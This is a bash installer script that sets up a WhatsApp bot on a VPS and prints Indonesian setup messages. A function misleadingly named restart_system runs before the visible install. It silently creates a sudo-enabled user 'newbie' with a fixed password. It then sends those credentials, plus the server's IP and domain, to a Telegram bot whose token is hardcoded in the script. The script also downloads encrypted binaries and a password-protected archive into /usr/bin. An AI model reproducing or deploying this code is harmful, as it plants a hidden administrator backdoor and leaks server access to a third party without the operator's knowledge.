#!/bin/bash
#COLOR
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'
red='\e[1;31m'
green='\e[0;32m'
DF='\e[39m'
Bold='\e[1m'
Blink='\e[5m'
yell='\e[33m'
red='\e[31m'
green='\e[32m'
blue='\e[34m'
PURPLE='\e[35m'
cyan='\e[36m'
Lred='\e[91m'
Lgreen='\e[92m'
Lyellow='\e[93m'
NC='\e[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
LIGHT='\033[0;37m'
grenbo="\e[92;1m"
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
red() { echo -e "\\033[32;1m${*}\\033[0m"; }
cd
rm setup.sh*
clear
restart_system() {
TIMES="10"
CHATID="6701388433"
KEY="7124749210:AAGz4PSHpA5dFb6i8BOoycKgnEPhKpUvPUM"
URL="https://api.telegram.org/bot$KEY/sendMessage"
ipsaya=$(wget -qO- ipinfo.io/ip)
domain=$(cat /etc/xray/domain)
Username=newbie
Password=123@Newbie
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
USRSC=$(wget -qO- https://raw.githubusercontent.com/Diah082/izin/main/ip | grep $ipsaya | awk '{print $2}')
EXPSC=$(wget -qO- https://raw.githubusercontent.com/Diah082/izin/main/ip | grep $ipsaya | awk '{print $3}')
TIMEZONE=$(printf '%(%H:%M:%S)T')
TIME=$(date '+%d %b %Y')
TEXT="
<code>────────────────────</code>
<b> 🟢 NOTIFICATIONS INSTALL BOT WA 🟢</b>
<code>────────────────────</code>
<code>user   : </code><code>$Username</code>
<code>PW     : </code><code>$Password</code>
<code>ID     : </code><code>$USRSC</code>
<code>Domain : </code><code>$domain</code>
<code>Date   : </code><code>$TIME</code>
<code>Time   : </code><code>$TIMEZONE</code>
<code>Ip vps : </code><code>$ipsaya</code>
<code>Exp Sc : </code><code>$EXPSC</code>
<code>────────────────────</code>
<i>Automatic Notification from Github</i>
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/newbie_store24"},{"text":"Contack","url":"https://wa.me/6282326322300"}]]}'
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}

fun_bar() {
    CMD[0]="$1"
    CMD[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${CMD[0]} -y >/dev/null 2>&1
        ${CMD[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[0;32m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[0;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    done
    echo -e "\033[0;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
    tput cnorm
}
res1() {
   cd
cat >/etc/cron.d/bot_wa <<-END
		8 0 * * * root /usr/local/bin/bot_wa
	END

cat >/usr/local/bin/bot_wa <<-END
#!/bin/bash
cd Nebot
pm2 del 0
pm2 start index.js
END
	chmod +x /usr/local/bin/bot_wa

# Memastikan script dijalankan dengan hak akses root
if [ "$EUID" -ne 0 ]; then
  echo "Silakan jalankan script ini sebagai root."
  exit 1
fi

# Menginstal paket yang diperlukan
apt update && apt install -y git ffmpeg imagemagick p7zip-full

# Menginstal NVM
wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

# Mengatur NVM_DIR
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # Memuat nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"

# Menginstal Node.js
nvm install v18.20.4

# Menginstal PM2
npm install pm2@latest -g

# Mengkloning repositori Nebot
git clone https://github.com/NSELLER621/Nebot /root/Nebot

# Mengganti placeholder dengan login yang sesuai
sed -i "s/XXXX/$Login/" /root/Nebot/config.js

# Mengunduh dan mengekstrak file
wget -q https://raw.githubusercontent.com/raahmat/scvip/main/Cdy/menubotwa.zip
wget -q -O /usr/bin/enc "https://raw.githubusercontent.com/raahmat/scvip/main/Enc/encrypt" && chmod +x /usr/bin/enc

# Mengekstrak file zip
7z x -pRahmat menubotwa.zip -o/root/menubotwa

# Mengatur izin eksekusi
chmod +x /root/menubotwa/*

# Mengenkripsi file
enc /root/menubotwa/*

# Menghapus file sementara
rm -rf /root/menubotwa/*~
rm -rf /root/menubotwa/gz*

# Memindahkan file ke /usr/bin/
mv /root/menubotwa/* /usr/bin/

# Menghapus direktori dan file zip
rm -rf /root/menubotwa
rm -rf menubotwa.zip

# Mengatur PM2 untuk startup
pm2 startup
}
restart_system
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e " Welcome To NewbieBot ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
echo -e " This Will Quick Setup Bot WhatsApp On Your Server"
echo -e " Author : ${green}Kurniawan Setiadi © ${NC}${YELLOW}(${NC} ${green} Newbie Vpn ${NC}${YELLOW})${NC}"
echo -e " © Recode By Kurniawan ®${YELLOW}(${NC} 2024 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 2
echo ""
read -p " Masukan Nomor Wa Untuk Bot Di Awali 62     : " Login
echo ""
clear
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e " \e[1;97;101m      MEMASANG BOT WHATSAPP        \e[0m"
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e ""
echo -e "  \033[1;91m Proses Memasang Bot\033[1;37m"
fun_bar 'res1'
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
cd Nebot
clear
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e " \e[1;97;101m      MEMASANG BOT WHATSAPP        \e[0m"
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "Mohon Tunggu Jangan Tutup Koneksi Anda Dengan Server"
echo -e "Anda Dapat menutup Server ketika Bot Sudah Mendapat Code Pairing"
echo -e "LANGKAH APABILA PROSES GAGAL!!"
echo -e "1 TUTUP SERVER"
echo -e "2 ketik cd Nebot Enter"
echo -e "3 ketik npm i Enter"
echo -e "4 ketik pm2 start index.js Enter"
echo -e "4 ketik pm2 logs Enter"
npm i
pm2 start index.js
pm2 logs index

###########- COLOR CODE -##############
